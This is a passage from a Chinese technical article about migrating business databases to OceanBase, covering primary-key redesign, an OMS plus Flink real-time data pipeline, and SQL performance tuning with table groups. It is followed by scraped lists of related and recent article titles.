的性能最优，还要考虑历史数据能够快速卸载，保证运维清理能够简单高效。该业务大表主键使用雪花算法，这种算法只能保证每一个DB有唯一性，在多个DB中有极小的概率会存在主键冲突。对于这种问题，如果是小表，可以通过查询、排除主键的方式来更改；如果是几十亿上百亿数据量的大表，使用排除主键法是不可行方案，会耗费大量资源，因此我们对主键做了一些改造，抛弃现有基于雪花算法的主键。新增了自增主键，并对所有DB的自增链设置了一个范围的起始值。这样能够保证在一定时间内数据库的主键不会冲突。而在这个时间段内，需要尽快合库合表并完成迁移。FLINK生态与OceanBase的结合debezium格式是万家数科在推进Flink生态所采用的统一，而当时OMS V3版本不支持此格式，如果改造涉及上下游链路非常多预估改造工作量巨大。经过沟通OceanBase-OMS开发团队针对debezium格式进行了相应的开发与适配，保证项目的顺利进行，在此感谢OceanBase技术团队的倾力支持。基于 BinLog 日志变更使用 kafka-connector 监听对集群数据进行实时捕获。需对每个 MySQL 节点进行日志监听，维护复杂难度大。任务调度不能保证实时性，推送延时大，业务量庞大时存在推送不及时、可靠性较差。下图基于OMS+Flink调度的流数据实时处理。取代了此前基于MySQL+Kafka的延时较高的任务调度模式。OMS 提供可视化的集中管控平台，界面化操作，可以基于时间点同步，维护成本低。同时使用 Flink 流实现实时数据处理逻辑。通过 Flink 的 StreamSink 和 TableSink 将处理后的数据实时推送到目标系统。确保目标系统支持实时数据的接收和处理。其 checkpoint 机制，实现任务的持续检查和恢复。在任务运行过程中，定期检查 checkpoint 状态，确保任务在异常情况下能够恢复到一致的状态。OMS+Flink 方案保证了用户操作简单和数据实时性，整个数据流转可在 2s 内完成，保证每一笔数据消费都能准确实时可靠地推送至每一个用户。优化案例解析利用OceanBase丰富的生态体系极大地简化了监控运维的工作，不仅提升了运维管理细粒度，还提高了运维效率。以OCP和ODC的性能优化为例。问题出现:某日凌晨，业务人员反馈在程序发布后，新增业务需求执行效率低下，该场景在UAT环境中性能稳定，上线后效率较之前降低几倍，造成业务单据压单，无法实时处理业务单据。问题分析:OCP：通过OCP-SQL诊断功能，发现该时间点TOPSQL中无明显慢SQL，通过与开发沟通得知该场景为高频SQL场景，平均响应时间慢几毫秒均会对业务产生影响，随即确定问题SQL。发现其并无相关索引问题呈现。ODC：将问题SQL 在ODC执行查询其实际执行计划，定位问题发现SQL存在较多RPC调用问题解决：新建表组避免RPC调用。(下图为建立表组后的SQL执行计划基本信息,可见已没有RPC调用)使用中存在的问题场景:业务通过 INSERT INTO ON DUPLICATE KEY UPDATE 避免约束冲突问题点：此语法对于约束冲突数据处理方式：MySQL 日志解析为UPDATEOceanBase 日志解析为DELETE、INSERT这对于数据传输下游而言是消费逻辑的转变，这种转变可能会使下游数据存在误差。目前没有找到有效的解决方案，只能尽量避免使用这种SQL语句，用其他语句代替，而这会带来额外的处理步骤。在 OceanBase 2024年的发布大会中，将带来更多零售行业的应用实践分享，欢迎点击参与！http://www.ppmy.cn/news/1540833.html相关文章股市形势复杂多变，投资者该如何应对？炒股自动化&amp;#xff1a;申请官方API接口&amp;#xff0c;散户也可以 python炒股自动化&amp;#xff08;0&amp;#xff09;&amp;#xff0c;申请券商API接口 python炒股自动化&amp;#xff08;1&amp;#xff09;&amp;#xff0c;量化交易接口区别 Python炒股自动化&amp;#xff08;2&amp;#xff09;&amp;#xff1a;获取…阅读更多...基于springboot的网上服装商城推荐系统的设计与实现基于springboot的网上服装商城推荐系统的设计与实现 
开发语言&amp;#xff1a;Java 框架&amp;#xff1a;springboot JDK版本&amp;#xff1a;JDK1.8 服务器&amp;#xff1a;tomcat7 数据库&amp;#xff1a;mysql 5.7 数据库工具&amp;#xff1a;Navicat11 开发软件&amp;#xff1a;idea 
源码获取&amp;#xf…阅读更多...HTML5_引用_语法规范_开发工具_常用标签目录 1. HTML 语法规范 
1.1 基本语法概述 
1.2 标签关系 
2. HTML 基本结构标签 
2.1 第一个 HTML 网页 
1.创建新文件 
2.进行保存&amp;#xff0c;这里可以选择保存到桌面&amp;#xff0c;但是后缀名一定要是.html 
2.2 基本结构标签总结 
3. 网页开发工具 
VSCode 的使用 
VSCode 工…阅读更多...并发编程的艺术Volatile 
作用 1. 保证共享变量的可见性&amp;#xff08;volatile修饰的变量进行操作对其他线程是可见的&amp;#xff09; 2. 插入读写屏障&amp;#xff0c;防止指令重排序。 
volatile 的底层实现 以下代码是对volatile修饰的instance变量赋值的汇编语言 
volatile Singleton instance
in…阅读更多...vue后台管理系统从0到1（5）文章目录 vue后台管理系统从0到1&amp;#xff08;5&amp;#xff09;完善侧边栏修改bug渲染header导航栏 vue后台管理系统从0到1&amp;#xff08;5&amp;#xff09; 接上一期&amp;#xff0c;我们需要完善我们的侧边狼 
完善侧边栏 
我们在 element 组件中可以看见&amp;#xff0c;这一个侧边栏是符合我们…阅读更多...element plus e-table表格中使用多选,当翻页时已选中的数据丢失摘要&amp;#xff1a; 点击第一页选中两个&amp;#xff0c;再选择第二页&amp;#xff0c;选中&amp;#xff0c;回到第一页&amp;#xff0c;之前选中的要保留&amp;#xff01; element ui table 
解决办法&amp;#xff1a; :row-key“getRowKeys” &amp;#xff08;写在el-table中&amp;#xff09; 
methods中声明 ge…阅读更多...99. UE5 GAS RPG 被动技能实现在这一篇&amp;#xff0c;我们在之前打下的基础下&amp;#xff0c;实现一下被动技能。 被动技能需要我们在技能栏上面选择升级解锁技能后&amp;#xff0c;将其设置到技能栏&amp;#xff0c;我们先增加被动技能使用的标签。 FGameplayTag Abilities_Passive_HaloOfProtection; //被动技能-守护光…阅读更多...【微信小程序_17_生命周期】摘要：本文介绍了小程序的生命周期，包括生命周期的定义、分类、生命周期函数等内容。生命周期分为应用生命周期和页面生命周期，生命周期函数由小程序框架提供，会按次序自动执行，开发人员可利用这些函数在特定时间点执行操作，如在页面加载时初始化数据。 微信小程序_17_生命…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:05 +0000</pubDate>
    </item>
  </channel>
</rss>
